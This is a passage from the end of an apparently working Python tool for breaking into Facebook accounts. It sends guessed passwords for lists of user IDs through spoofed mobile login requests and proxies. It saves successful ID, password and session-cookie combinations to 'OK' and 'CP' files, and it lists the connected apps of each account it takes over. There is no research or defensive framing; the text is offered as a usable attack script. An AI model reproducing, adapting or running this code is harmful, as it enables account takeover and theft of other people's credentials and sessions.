			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}——> {K}{idf}|{pw}\n——> {ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r{x}——> {H}{idf}|{pw}\n——> {kuki}\n——> {m}{ua}{N}')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1

					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print(f'\r{x}——> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
					os.popen('play-audio data/ok.mp3')
					ok+=1
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> Alvino_Adijaya_Xy <<<<<#
